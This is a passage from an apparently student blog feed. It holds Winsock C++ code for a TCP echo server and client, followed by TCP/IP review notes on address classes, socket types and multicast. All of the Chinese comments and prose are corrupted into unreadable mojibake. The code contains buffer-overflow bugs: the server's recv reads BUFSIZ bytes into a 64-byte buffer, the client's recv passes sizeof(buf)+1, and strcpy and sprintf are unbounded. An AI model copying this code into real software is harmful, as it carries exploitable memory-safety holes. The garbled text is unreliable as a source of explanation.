æœåŠ¡å™¨å¥—æ¥å­—ï¼Œç”¨äºç›‘å¬å®¢æˆ·ç«¯è¯·æ±‚</span><br>    SOCKET  sClient;<span class="hljs-comment">// å®¢æˆ·ç«¯å¥—æ¥å­—ï¼Œç”¨äºå®ç°ä¸å®¢æˆ·ç«¯çš„é€šä¿¡   </span><br>    <span class="hljs-keyword">int</span>     retVal;<span class="hljs-comment">// è°ƒç”¨å„ç§Socketå‡½æ•°çš„è¿”å›å€¼   </span><br>    <span class="hljs-keyword">char</span>    buf[BUF_SIZE];<span class="hljs-comment">// ç”¨äºæ¥å—å®¢æˆ·ç«¯æ•°æ®çš„ç¼“å†²åŒº   </span><br>  <br>    <span class="hljs-comment">// åˆå§‹åŒ–å¥—æ¥å­—åŠ¨æ€åº“   </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),&amp;wsd) != <span class="hljs-number">0</span>)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartup failed !\n&quot;</span>);   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// åˆ›å»ºç”¨äºç›‘å¬çš„å¥—æ¥å­—   </span><br>    sServer = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,IPPROTO_TCP);   <br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> iMode = <span class="hljs-number">1</span>;<br>    retVal = <span class="hljs-built_in">ioctlsocket</span>(sServer, FIONBIO, &amp;iMode);<br>    <span class="hljs-keyword">if</span>(INVALID_SOCKET == sServer)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;     <br><br>    <span class="hljs-comment">// è®¾ç½®æœåŠ¡å™¨å¥—æ¥å­—åœ°å€   </span><br>    SOCKADDR_IN addrServ;   <br>    addrServ.sin_family = AF_INET;   <br>    addrServ.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9990</span>);<span class="hljs-comment">// ç›‘å¬ç«¯å£ä¸º9990</span><br>    addrServ.sin_addr.S_un.S_addr = <span class="hljs-built_in">htonl</span>(INADDR_ANY);    <br>    <span class="hljs-comment">// ç»‘å®šå¥—æ¥å­—sServeråˆ°æœ¬åœ°åœ°å€ï¼Œç«¯å£9990  </span><br>    retVal = <span class="hljs-built_in">bind</span>(sServer,(<span class="hljs-keyword">const</span> struct sockaddr*)&amp;addrServ,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(SOCKADDR_IN));   <br><br>    <span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bind failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">closesocket</span>(sServer);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// ç›‘å¬å¥—æ¥å­—   </span><br>    retVal = <span class="hljs-built_in">listen</span>(sServer,<span class="hljs-number">1</span>);   <br>    <span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listen failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">closesocket</span>(sServer);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// æ¥å—å®¢æˆ·è¯·æ±‚   </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TCP Server start...\n&quot;</span>);<br>    sockaddr_in addrClient;<span class="hljs-comment">// å®¢æˆ·ç«¯åœ°å€</span><br>    <span class="hljs-keyword">int</span> addrClientlen = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(addrClient);   <br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        sClient = <span class="hljs-built_in">accept</span>(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen);<br>        <span class="hljs-keyword">if</span> (INVALID_SOCKET == sClient)<br>        &#123;<br>            <span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br>            <span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>            &#123;<br>                <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;accept failed!\n&quot;</span>);<br>                <span class="hljs-built_in">closesocket</span>(sServer);<br>                <span class="hljs-built_in">WSACleanup</span>();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    &#125;<br>   <br>    <span class="hljs-comment">// å¾ªç¯æ¥æ”¶å®¢æˆ·ç«¯çš„æ•°æ®ï¼Œç›´æ¥å®¢æˆ·ç«¯å‘é€quitå‘½ä»¤åé€€å‡ºã€‚  </span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-built_in">ZeroMemory</span>(buf,BUF_SIZE);<span class="hljs-comment">// æ¸…ç©ºæ¥æ”¶æ•°æ®çš„ç¼“å†²åŒº</span><br>retVal = <span class="hljs-built_in">recv</span>(sClient,buf,BUFSIZ,<span class="hljs-number">0</span>);<span class="hljs-comment">// </span><br><span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal )   <br>&#123;   <br>            <span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br>            <span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>            &#123;<br>                <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err == WSAETIMEDOUT || err == WSAENETDOWN)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv failed!\n&quot;</span>);<br>                <span class="hljs-built_in">closesocket</span>(sServer);<br>                <span class="hljs-built_in">closesocket</span>(sClient);<br>                <span class="hljs-built_in">WSACleanup</span>();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br><br>&#125; <br>        <span class="hljs-keyword">if</span> (buf == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">// è·å–å½“å‰ç³»ç»Ÿæ—¶é—´</span><br>SYSTEMTIME st;<br><span class="hljs-built_in">GetLocalTime</span>(&amp;st);<br><span class="hljs-keyword">char</span> sDateTime[<span class="hljs-number">30</span>];<br><span class="hljs-built_in">sprintf</span>(sDateTime, <span class="hljs-string">&quot;%4d-%2d-%2d %2d:%2d:%2d&quot;</span>,st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);<br><span class="hljs-comment">// æ‰“å°è¾“å‡ºçš„ä¿¡æ¯</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Recv From Client [%s:%d] :%s\n&quot;</span>, sDateTime, <span class="hljs-built_in">inet_ntoa</span>(addrClient.sin_addr), addrClient.sin_port, buf);   <br><span class="hljs-comment">// å¦‚æœå®¢æˆ·ç«¯å‘é€quitå­—ç¬¦ä¸²ï¼Œåˆ™æœåŠ¡å™¨é€€å‡º</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;quit&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>    retVal = <span class="hljs-built_in">send</span>(sClient,<span class="hljs-string">&quot;quit&quot;</span>,<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;quit&quot;</span>),<span class="hljs-number">0</span>);   <br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><span class="hljs-comment">// å¦åˆ™å‘å®¢æˆ·ç«¯å‘é€å›æ˜¾å­—ç¬¦ä¸²</span><br>&#123;<br>    <span class="hljs-keyword">char</span>    msg[BUF_SIZE];  <br>    <span class="hljs-built_in">sprintf</span>(msg, <span class="hljs-string">&quot;Message received - %s&quot;</span>, buf); <br>retVal = <span class="hljs-built_in">send</span>(sClient, msg, <span class="hljs-built_in">strlen</span>(msg),<span class="hljs-number">0</span>);   <br>    <span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal)   <br>&#123;   <br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send failed !\n&quot;</span>);   <br> <span class="hljs-built_in">closesocket</span>(sServer);   <br>   <span class="hljs-built_in">closesocket</span>(sClient);   <br>   <span class="hljs-built_in">WSACleanup</span>();   <br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>&#125;   <br>&#125;<br>&#125;<br>    <span class="hljs-comment">// é‡Šæ”¾å¥—æ¥å­—   </span><br>    <span class="hljs-built_in">closesocket</span>(sServer);   <br>    <span class="hljs-built_in">closesocket</span>(sClient);   <br>    <span class="hljs-built_in">WSACleanup</span>();   <br><span class="hljs-comment">// æš‚åœï¼ŒæŒ‰ä»»æ„é”®é€€å‡º</span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// TcpClient.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Winsock2.H&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;WS2_32.lib&quot;</span>)   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE    64          <span class="hljs-comment">// ç¼“å†²åŒºå¤§å°  </span></span><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])<br>&#123;<br>WSADATA     wsd;<span class="hljs-comment">// ç”¨äºåˆå§‹åŒ–Windows Socket   </span><br>    SOCKET      sHost;<span class="hljs-comment">// ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„å¥—æ¥å­—   </span><br>    SOCKADDR_IN servAddr;<span class="hljs-comment">// æœåŠ¡å™¨åœ°å€   </span><br>    <span class="hljs-keyword">char</span>        buf[BUF_SIZE];<span class="hljs-comment">// ç”¨äºæ¥å—æ•°æ®ç¼“å†²åŒº   </span><br>    <span class="hljs-keyword">int</span>         retVal;<span class="hljs-comment">// è°ƒç”¨å„ç§Socketå‡½æ•°çš„è¿”å›å€¼   </span><br><span class="hljs-comment">// åˆå§‹åŒ–Windows Socket</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),&amp;wsd) != <span class="hljs-number">0</span>)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartup failed !\n&quot;</span>);   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// åˆ›å»ºå¥—æ¥å­—   </span><br>    sHost = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,IPPROTO_TCP);   <br>    <span class="hljs-keyword">if</span>(INVALID_SOCKET == sHost)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;    <br>    <span class="hljs-comment">// è®¾ç½®æœåŠ¡å™¨åœ°å€   </span><br>    servAddr.sin_family = AF_INET;   <br>    servAddr.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">// ç”¨æˆ·éœ€è¦æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹</span><br>    servAddr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9990</span>);<span class="hljs-comment">// åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå»ºè®®å°†æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£å·ä¿å­˜åœ¨é…ç½®æ–‡ä»¶ä¸­</span><br>    <span class="hljs-keyword">int</span> sServerAddlen = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(servAddr);<span class="hljs-comment">// è®¡ç®—åœ°å€çš„é•¿åº¦       </span><br>    <span class="hljs-comment">// è¿æ¥æœåŠ¡å™¨   </span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>retVal = <span class="hljs-built_in">connect</span>(sHost, (LPSOCKADDR)&amp;servAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(servAddr));<br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br><span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK || err == WSAEINVAL)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">500</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err == WSAEISCONN)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect failed !\n&quot;</span>);<br><span class="hljs-built_in">closesocket</span>(sHost);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// å¾ªç¯å‘æœåŠ¡å™¨å‘é€å­—ç¬¦ä¸²ï¼Œå¹¶æ˜¾ç¤ºåé¦ˆä¿¡æ¯ã€‚</span><br><span class="hljs-comment">// å‘é€quitå°†ä½¿æœåŠ¡å™¨ç¨‹åºé€€å‡ºï¼ŒåŒæ—¶å®¢æˆ·ç«¯ç¨‹åºè‡ªèº«ä¹Ÿå°†é€€å‡º</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-comment">// å‘æœåŠ¡å™¨å‘é€æ•°æ®   </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input a string to send: &quot;</span>);<br><span class="hljs-comment">// æ¥æ”¶è¾“å…¥çš„æ•°æ®</span><br>std::string str;<br>std::<span class="hljs-built_in">getline</span>(std::cin, str);<br><span class="hljs-comment">// å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¤åˆ¶åˆ°bufä¸­</span><br><span class="hljs-built_in">ZeroMemory</span>(buf,BUF_SIZE);   <br><span class="hljs-built_in">strcpy</span>(buf,str.<span class="hljs-built_in">c_str</span>());   <br>        <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\0&#x27;</span>)<br>            <span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">// å‘æœåŠ¡å™¨å‘é€æ•°æ®</span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>retVal = <span class="hljs-built_in">send</span>(sHost, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);<br><span class="hljs-comment">//retVal = WSASend(sHost, buf, BUF_SIZE, strlen(buf),0,NULL,NULL);</span><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br><span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">500</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send failed!\n&quot;</span>);<br><span class="hljs-built_in">closesocket</span>(sHost);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// æ¥æ”¶æœåŠ¡å™¨å›ä¼ çš„æ•°æ®  </span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-built_in">ZeroMemory</span>(buf, BUF_SIZE);<br>retVal = <span class="hljs-built_in">recv</span>(sHost, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf) + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br><span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waiting back msg!\n&quot;</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err == WSAETIMEDOUT || err == WSAENETDOWN)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv failed!\n&quot;</span>);<br><span class="hljs-built_in">closesocket</span>(sHost);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Recv From Server: %s\n&quot;</span>,buf);   <br><span class="hljs-comment">// å¦‚æœæ”¶åˆ°quitï¼Œåˆ™é€€å‡º</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;quit&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;quit!\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>    <span class="hljs-comment">// é‡Šæ”¾èµ„æº   </span><br>    <span class="hljs-built_in">closesocket</span>(sHost);   <br>    <span class="hljs-built_in">WSACleanup</span>();   <br><span class="hljs-comment">// æš‚åœï¼ŒæŒ‰ä»»æ„é”®ç»§ç»­</span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="3-23"><a href="#3-23" class="headerlink" title="3/23"></a>3/23</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323111552979.png" class="" title="image-20200323111552979"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323113425859.png" class="" title="image-20200323113425859"><h2 id="3-30"><a href="#3-30" class="headerlink" title="3/30"></a>3/30</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140139366.png" class="" title="image-20200330140139366"><p>é˜»å¡ï¼šé€‚åˆé€šä¿¡é‡è¾ƒå°‘çš„ç®€å•åº”ç”¨ï¼Œæ²¡æœ‰å®Œæˆä¹‹å‰ä¸ä¼šè¿”å›</p><p>éé˜»å¡:å¹¶å‘å¼º</p><h2 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140556146.png" class="" title="image-20200330140556146"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140713774.png" class="" title="image-20200330140713774"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140911046.png" class="" title="image-20200330140911046"><h2 id="4-13"><a href="#4-13" class="headerlink" title="4/13"></a>4/13</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200413135556939.png" class="" title="image-20200413135556939"><h2 id="4-20"><a href="#4-20" class="headerlink" title="4/20"></a>4/20</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200420113827282.png" class="" title="image-20200420113827282"><h2 id="5-11"><a href="#5-11" class="headerlink" title="5/11"></a>5/11</h2><p>ç”¨æˆ·ç±»æ‰“äº¤é“æœ€å¤šçš„æ˜¯Viewè§†å›¾ç±»ï¼Œå¯¹ç•Œé¢å„ç§æ“ä½œå“åº”</p>]]></content>
    
    
    <categories>
      
      <category>ä¸“ä¸šå­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¸“ä¸šå­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCPIPå¤ä¹ </title>
    <link href="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h2><p>Aç±»åœ°å€ å…¬æœ‰1~126 </p><table><thead><tr><th align="center">åœ°å€ç±»å‹</th><th align="center">å…¬æœ‰</th><th align="center">ç§æœ‰</th></tr></thead><tbody><tr><td align="center">Aç±»</td><td align="center">1 ~ 126</td><td align="center">10.0.0.0 ~ 10.255.255.255</td></tr><tr><td align="center">Bç±»</td><td align="center">128 ~ 191</td><td align="center">172.16.0.0 ~ 172.31.255.255</td></tr><tr><td align="center">Cç±»</td><td align="center">192.0.0.0 ~ 223.255.255.255</td><td align="center">192.168.0.0 ~ 192.168.255.255</td></tr></tbody></table><h2 id="ç›´æ¥äº¤ä»˜å’Œé—´æ¥äº¤ä»˜"><a href="#ç›´æ¥äº¤ä»˜å’Œé—´æ¥äº¤ä»˜" class="headerlink" title="ç›´æ¥äº¤ä»˜å’Œé—´æ¥äº¤ä»˜"></a>ç›´æ¥äº¤ä»˜å’Œé—´æ¥äº¤ä»˜</h2><p>ç›´æ¥äº¤ä»˜ -&gt; äº¤ç»™åŒä¸€ä¸ªç½‘ç»œåœ°å€</p><p>é—´æ¥äº¤ä»˜ -&gt; ç»è¿‡ä¸€ä¸ªç›´æ¥äº¤ä»˜ï¼Œç»™è·¯ç”±å™¨ï¼Œå†ç»™è·¯ç”±å™¨ ç›´åˆ°åˆ°è¾¾åŒä¸€ä¸ªç½‘ç»œçš„è·¯ç”±å†ç»™ä¸»æœº</p><h2 id="ç«¯åˆ°ç«¯å’Œç‚¹åˆ°ç‚¹"><a href="#ç«¯åˆ°ç«¯å’Œç‚¹åˆ°ç‚¹" class="headerlink" title="ç«¯åˆ°ç«¯å’Œç‚¹åˆ°ç‚¹"></a>ç«¯åˆ°ç«¯å’Œç‚¹åˆ°ç‚¹</h2><p>ç«¯åˆ°ç«¯ -&gt; è¿›ç¨‹åˆ°è¿›ç¨‹</p><p>ç‚¹åˆ°ç‚¹ -&gt; è®¾å¤‡åˆ°è®¾å¤‡</p><h2 id="ä¸‰å…ƒç»„äº”å…ƒç»„"><a href="#ä¸‰å…ƒç»„äº”å…ƒç»„" class="headerlink" title="ä¸‰å…ƒç»„äº”å…ƒç»„"></a>ä¸‰å…ƒç»„äº”å…ƒç»„</h2><p>ä¸‰å…ƒç»„ï¼šåè®®ï¼ŒIPåœ°å€ï¼Œç«¯å£</p><p>äº”å…ƒç»„ï¼šä¸‰å…ƒ + æºIPï¼Œæºç«¯å£</p><h3 id="TCP-å¯é æ€§"><a href="#TCP-å¯é æ€§" class="headerlink" title="TCP å¯é æ€§"></a>TCP å¯é æ€§</h3><ul><li>æµé‡æ§åˆ¶ï¼šæ»‘åŠ¨çª—å£ } å‘é€çª—å£</li><li>æ‹¥å¡æ§åˆ¶ï¼š æ‹¥å¡çª—å£ é‡è½¬å®šæ—¶å™¨</li><li>å·®é”™æ§åˆ¶</li></ul><h3 id="å¥—æ¥å­—"><a href="#å¥—æ¥å­—" class="headerlink" title="å¥—æ¥å­—"></a>å¥—æ¥å­—</h3><ul><li>æµå¥—æ¥å­—ï¼šTCP é€‚åˆå¤§é‡æ•°æ® å•æ’­</li><li>æ•°æ®æŠ¥å¥—æ¥å­—ï¼š UDP</li><li>åŸå§‹å¥—æ¥å­—ï¼šç¼–å†™è‡ªå®šåº•å±‚åè®®</li></ul><h3 id="IPå¤šæ’­"><a href="#IPå¤šæ’­" class="headerlink" title="IPå¤šæ’­"></a>IPå¤šæ’­</h3><p>==äº”ä¸ªå‰æï¼Ÿ==</p><p>å¤šæ’­åœ°å€ 224.0.0.0 ~ 239.255.255.255</p><p>IPåœ°å€çš„ä½23ä½æ›¿æ¢macåœ°å€ä½23ä½ï¼Œç¬¬24ä½ä¸º0</p><ul><li>è¯­ä¹‰</li><li>è¯­æ³•</li><li>æ—¶åº</li></ul><h2 